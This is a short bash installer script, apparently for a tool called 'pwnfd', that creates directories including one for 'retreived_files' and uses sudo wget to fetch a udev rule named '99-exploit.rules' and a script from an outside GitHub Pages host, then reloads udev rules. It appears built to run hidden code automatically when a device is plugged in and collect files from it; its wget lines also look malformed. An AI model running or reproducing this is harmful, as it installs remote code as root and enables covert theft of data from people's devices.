#!/bin/bash


mkdir -p /tmp/pwnfd/{logs,retreived_files}
touch /tmp/pwnfd/logs/logfile
sudo wget https://sahruldotid.github.io/99-exploit.rules /etc/udev/rules.d/99-exploit.rules
sudo wget https://sahruldotid.github.io/pwnfd.sh /tmp/pwnfd.sh
sudo udevadm control --reload-rules
